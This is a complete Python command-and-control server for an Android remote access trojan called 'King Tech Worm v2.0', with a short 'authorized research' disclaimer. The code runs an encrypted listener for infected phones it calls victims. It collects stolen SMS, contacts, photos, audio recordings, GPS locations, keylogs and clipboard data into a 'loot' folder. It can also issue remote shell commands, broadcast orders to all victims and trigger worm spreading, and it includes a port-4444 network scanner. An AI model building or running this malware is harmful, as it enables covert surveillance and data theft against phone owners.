#!/usr/bin/env python3
"""
King Tech Worm v2.0 - Advanced C2
Encrypted Android RAT Controller
For authorized security research only.
"""

import socket
import threading
import json
import os
import sys
import base64
import hashlib
import time
import ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
except ImportError:
    print("[!] pycryptodome required: pip install pycryptodome colorama")
    sys.exit(1)

init(autoreset=True)

# ================== CONFIG ==================
HOST = "0.0.0.0"
PORT = 4444
AES_KEY = hashlib.sha256(b"K1ngT3chW0rmX_SecretKey_2026").digest()  # Change this
BANNER = f"""
{Fore.RED}
██╗  ██╗██╗███╗   ██╗ ██████╗     ████████╗███████╗ ██████╗██╗  ██╗
██║ ██╔╝██║████╗  ██║██╔════╝     ╚══██╔══╝██╔════╝██╔════╝██║  ██║
█████╔╝ ██║██╔██╗ ██║██║  ███╗       ██║   █████╗  ██║     ███████║
██╔═██╗ ██║██║╚██╗██║██║   ██║       ██║   ██╔══╝  ██║     ██╔══██║
██║  ██╗██║██║ ╚████║╚██████╔╝       ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
{Style.RESET_ALL}
          {Fore.CYAN}King Tech Worm v2.0 | Encrypted C2 | Kali Edition{Style.RESET_ALL}
"""

class CryptoHelper:
    @staticmethod
    def encrypt(data: str) -> str:
        iv = get_random_bytes(16)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(iv + ct).decode()

    @staticmethod
    def decrypt(data: str) -> str:
        try:
            raw = base64.b64decode(data)
            iv, ct = raw[:16], raw[16:]
            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(ct), AES.block_size).decode()
        except Exception:
            return ""

class Client:
    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.id = f"{addr[0]}:{addr[1]}"
        self.info = {}
        self.last_seen = datetime.now()
        self.lock = threading.Lock()

    def send(self, data: dict):
        try:
            payload = CryptoHelper.encrypt(json.dumps(data))
            with self.lock:
                self.sock.sendall((payload + "\n").encode())
            return True
        except Exception:
            return False

    def recv(self) -> dict:
        try:
            data = b""
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    return {}
                data += chunk
                if b"\n" in chunk:
                    break
            decrypted = CryptoHelper.decrypt(data.decode().strip())
            if decrypted:
                return json.loads(decrypted)
            return {}
        except Exception:
            return {}

class KingTechC2:
    def __init__(self):
        self.clients = {}
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = True
        self.lock = threading.Lock()

    def start(self):
        print(BANNER)
        self.server.bind((HOST, PORT))
        self.server.listen(100)
        print(f"{Fore.GREEN}[+] C2 listening on {HOST}:{PORT}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] AES-256 encryption enabled{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Type 'help' for commands{Style.RESET_ALL}\n")

        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.command_loop()

    def accept_loop(self):
        while self.running:
            try:
                sock, addr = self.server.accept()
                client = Client(sock, addr)
                threading.Thread(target=self.handle_client, args=(client,), daemon=True).start()
            except Exception:
                break

    def handle_client(self, client: Client):
        # First message should be device info
        info = client.recv()
        if info.get("type") == "hello":
            client.info = info.get("data", {})
            with self.lock:
                self.clients[client.id] = client
            model = client.info.get("model", "Unknown")
            android = client.info.get("android", "?")
            print(f"{Fore.GREEN}[+] New victim: {client.id} | {model} | Android {android}{Style.RESET_ALL}")

        while self.running:
            msg = client.recv()
            if not msg:
                break
            client.last_seen = datetime.now()
            self.process_message(client, msg)

        with self.lock:
            if client.id in self.clients:
                del self.clients[client.id]
        print(f"{Fore.RED}[-] Disconnected: {client.id}{Style.RESET_ALL}")
        try:
            client.sock.close()
        except Exception:
            pass

    def process_message(self, client: Client, msg: dict):
        mtype = msg.get("type", "")
        data = msg.get("data", "")

        if mtype == "photo":
            filename = f"loot/{client.id.replace(':', '_')}_photo_{int(time.time())}.jpg"
            os.makedirs("loot", exist_ok=True)
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data))
            print(f"{Fore.MAGENTA}[PHOTO] Saved: {filename}{Style.RESET_ALL}")

        elif mtype == "audio":
            filename = f"loot/{client.id.replace(':', '_')}_audio_{int(time.time())}.3gp"
            os.makedirs("loot", exist_ok=True)
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data))
            print(f"{Fore.MAGENTA}[AUDIO] Saved: {filename}{Style.RESET_ALL}")

        elif mtype == "sms":
            print(f"{Fore.CYAN}[SMS from {client.id}]{Style.RESET_ALL}")
            print(data)

        elif mtype == "contacts":
            print(f"{Fore.CYAN}[CONTACTS from {client.id}]{Style.RESET_ALL}")
            print(data)

        elif mtype == "location":
            print(f"{Fore.CYAN}[GPS {client.id}] {data}{Style.RESET_ALL}")

        elif mtype == "keylog":
            print(f"{Fore.YELLOW}[KEYLOG {client.id}] {data}{Style.RESET_ALL}")

        elif mtype == "filelist":
            print(f"{Fore.CYAN}[FILES {client.id}]{Style.RESET_ALL}")
            print(data)

        elif mtype == "shell":
            print(f"{Fore.GREEN}[SHELL {client.id}]{Style.RESET_ALL}")
            print(data)

        elif mtype == "apps":
            print(f"{Fore.CYAN}[APPS {client.id}]{Style.RESET_ALL}")
            print(data)

        elif mtype == "clipboard":
            print(f"{Fore.YELLOW}[CLIPBOARD {client.id}] {data}{Style.RESET_ALL}")

        elif mtype == "worm_report":
            print(f"{Fore.RED}[WORM] {client.id}: {data}{Style.RESET_ALL}")

        else:
            print(f"[{client.id}] {mtype}: {str(data)[:200]}")

    def command_loop(self):
        while self.running:
            try:
                cmd = input(f"{Fore.GREEN}KingTech> {Style.RESET_ALL}").strip()
                if not cmd:
                    continue
                self.execute_command(cmd)
            except (KeyboardInterrupt, EOFError):
                self.running = False
                break

    def execute_command(self, cmd: str):
        parts = cmd.split()
        if not parts:
            return
        action = parts[0].lower()

        if action == "help":
            self.print_help()
        elif action == "list" or action == "victims":
            self.list_clients()
        elif action == "scan":
            if len(parts) > 1:
                self.network_scan(parts[1])
            else:
                print("Usage: scan 192.168.1.0/24")
        elif action == "exit" or action == "quit":
            self.running = False
            print("[*] Shutting down...")
            self.server.close()
            sys.exit(0)
        elif action == "broadcast":
            if len(parts) < 2:
                print("Usage: broadcast <command>")
                return
            self.broadcast(" ".join(parts[1:]))
        elif len(parts) >= 2:
            # <id> <command>
            target_id = parts[0]
            subcmd = parts[1].lower()
            args = parts[2:] if len(parts) > 2 else []
            self.send_to_client(target_id, subcmd, args)
        else:
            print("Unknown command. Type 'help'")

    def print_help(self):
        help_text = f"""
{Fore.CYAN}=== King Tech Worm v2.0 Commands ==={Style.RESET_ALL}
  help                          Show this help
  list / victims                List connected victims
  scan <CIDR>                   Network scanner (e.g. 192.168.1.0/24)
  broadcast <cmd>               Send command to all victims
  exit                          Shutdown C2

{Fore.YELLOW}Victim commands (use: <id> <command>):{Style.RESET_ALL}
  <id> info                     Device information
  <id> photo                    Take photo (front camera)
  <id> photo back               Take photo (back camera)
  <id> audio <seconds>          Record audio
  <id> sms                      Steal SMS inbox
  <id> contacts                 Steal contacts
  <id> location                 Get GPS location
  <id> keylog                   Get keylogger buffer
  <id> apps                     List installed apps
  <id> clipboard                Get clipboard content
  <id> files <path>             List files in path
  <id> download <path>          Download file
  <id> shell <command>          Execute shell command
  <id> worm                     Trigger local network worm scan
  <id> kill                     Kill the payload
"""
        print(help_text)

    def list_clients(self):
        if not self.clients:
            print(f"{Fore.YELLOW}[*] No victims connected{Style.RESET_ALL}")
            return
        print(f"\n{Fore.CYAN}{'ID':<22} {'Model':<20} {'Android':<10} {'Last Seen'}{Style.RESET_ALL}")
        print("-" * 70)
        for cid, client in self.clients.items():
            model = client.info.get("model", "Unknown")[:18]
            android = client.info.get("android", "?")
            last = client.last_seen.strftime("%H:%M:%S")
            print(f"{cid:<22} {model:<20} {android:<10} {last}")
        print()

    def send_to_client(self, target_id: str, subcmd: str, args: list):
        # Allow partial ID match
        matched = None
        for cid in self.clients:
            if target_id in cid:
                matched = cid
                break
        if not matched:
            print(f"{Fore.RED}[-] Victim not found: {target_id}{Style.RESET_ALL}")
            return

        client = self.clients[matched]
        payload = {"type": subcmd, "args": args}
        if client.send(payload):
            print(f"{Fore.GREEN}[+] Sent '{subcmd}' to {matched}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to send to {matched}{Style.RESET_ALL}")

    def broadcast(self, cmd: str):
        parts = cmd.split()
        subcmd = parts[0]
        args = parts[1:] if len(parts) > 1 else []
        count = 0
        for cid, client in list(self.clients.items()):
            if client.send({"type": subcmd, "args": args}):
                count += 1
        print(f"{Fore.GREEN}[+] Broadcast '{subcmd}' to {count} victims{Style.RESET_ALL}")

    def network_scan(self, cidr: str):
        print(f"{Fore.YELLOW}[*] Scanning {cidr} ...{Style.RESET_ALL}")
        try:
            network = ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            print("Invalid CIDR")
            return

        def check(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.4)
                result = sock.connect_ex((str(ip), 4444))
                sock.close()
                if result == 0:
                    return str(ip)
            except Exception:
                pass
            return None

        found = []
        with ThreadPoolExecutor(max_workers=80) as executor:
            results = executor.map(check, network.hosts())
            for r in results:
                if r:
                    found.append(r)
                    print(f"{Fore.GREEN}[+] Open 4444: {r}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Scan finished. Found {len(found)} hosts with port 4444 open{Style.RESET_ALL}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.YELLOW}[!] Recommended to run as root{Style.RESET_ALL}")
    c2 = KingTechC2()
    c2.start()
